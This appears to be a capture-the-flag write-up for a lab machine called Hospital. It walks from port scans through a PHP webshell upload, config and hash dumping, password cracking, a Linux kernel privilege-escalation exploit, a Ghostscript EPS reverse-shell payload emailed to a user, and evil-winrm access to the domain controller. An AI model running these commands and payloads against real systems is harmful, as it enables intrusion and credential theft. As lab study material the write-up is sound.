# Hospital

## NMAP
```
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-11-26 02:21:32Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-26T02:22:23+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2025-11-25T02:19:54
|_Not valid after:  2026-05-27T02:19:54
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time:
|   date: 2025-11-26T02:22:25
|_  start_date: N/A

```

```
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1801/tcp open  msmq
2103/tcp open  zephyr-clt
2105/tcp open  eklogin
2107/tcp open  msmq-mgmt
2179/tcp open  vmrdp
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
6014/tcp open  x11
6404/tcp open  boe-filesvr
6406/tcp open  boe-processsvr
6407/tcp open  boe-resssvr1
6409/tcp open  boe-resssvr3
6613/tcp open  unknown
6637/tcp open  unknown
8080/tcp open  http-proxy
9389/tcp open  adws

```


## Foothold
- 8080 has a webapp to upload medical records.
    - created an account (there is already an admin account - cant crack creds for it)
    - uploaded a laudanum `webshell.phar` and accessed it at `/uploads/webshell.php`
    - `cat ../config.php`
    ```
    <?php
    /* Database credentials. Assuming you are running MySQL
    server with default setting (user 'root' with no password) */
    define('DB_SERVER', 'localhost');
    define('DB_USERNAME', 'root');
    define('DB_PASSWORD', 'my$qls3rv1c3!');
    define('DB_NAME', 'hospital');
    
    /* Attempt to connect to MySQL database */
    $link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
    
    // Check connection
    if($link === false){
        die("ERROR: Could not connect. " . mysqli_connect_error());
    }
    ?>
    ```
    - found user `drwilliams`
- `mysql -u root -p''`
```
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
+----+----------+--------------------------------------------------------------+---------------------+
```
- cracked using john
    - `admin:123456` & `patient:patient`
- `uname -a`
    - https://github.com/synacktiv/CVE-2023-35001
    - `make`
    - copy `exploit` and `wrapper` to the target
    - `./exploit` to get root
- `cat /etc/shadow`
```
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::

drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```
- `hashcat -m 1800 drwilliams.hash rockyou.txt`
    - `drwilliams:qwe123!@#`
- open ssh to drwilliams gives nothing
- using these creds for the 443 hospital webmail app
    - we see that drbrown has sent an email
```
Dear Lucy,

I wanted to remind you that the project for lighter, cheaper and
environmentally friendly needles is still ongoing ðŸ’‰. You are the one in
charge of providing me with the designs for these so that I can take
them to the 3D printing department and start producing them right away.
Please make the design in an ".eps" file format so that it can be well
visualized with GhostScript.

Best regards,
Chris Brown.
ðŸ˜ƒ
```
- we can prolly send .eps files to drbrown and they will be opened by with ghostscript.
- https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
- `python3 CVE_2023_36664_exploit.py --generate --payload 'powershell -e base64' --filename revshell --extension eps`
    - use revshells to generate a base64 payload
    - this will create a `revshell.eps` file
- starting nc 4242
- compose a new email to drbrown and attach the revshell.eps file
- wait to get a reverse shell on the nc listener
- get user.txt - d2a7cd1e74c0840c9f34765e1a91df8d

## Privesc
- cat ghostscript.bat
```
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```

- `evil-winrm -i 10.10.11.241 -u drbrown -p 'chr!$br0wn'`
- Running winpeas.exe
```
Folder: C:\Users\drbrown.HOSPITAL\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup  
FolderPerms: drbrown [AllAccess]
File: C:\Users\drbrown.HOSPITAL\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected) - C:\Users\drbrown.HOSPITAL\AppData\Roaming\Microsoft\Windows          
FilePerms: drbrown [AllAccess]
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787 

C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles] 

Vulnerable Leaked Handlers
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation                                                                                                     
Getting Leaked Handlers, it might take some time...                                                     
    Handle: 1908(key)              
    Handle Owner: Pid is 11132(winpeas) with owner: drbrown                                                   
    Reason: TakeOwnership      
    Registry: HKLM\software\classes\extensions\contractid  

```

- Found an rdp instance that is active as drbrown
- `xfreerdp /v:10.10.11.241 /u:drbrown /drive:linux,/home/kali/tools/AD-tools`
    - there is a password being entered for `Administrator` in the roundcube instance.
    - this is selenium
    - change the HTML using inspect element
        - change the password to text
    - ![alt text](/docs/blog/attachments/hospital.png)
- `Administrator:Th3B3stH0sp1t4l9786!`
- `evil-winrm` as Administrator to get the root.txt - e9b8052436e896bc5862be4ac44d361f
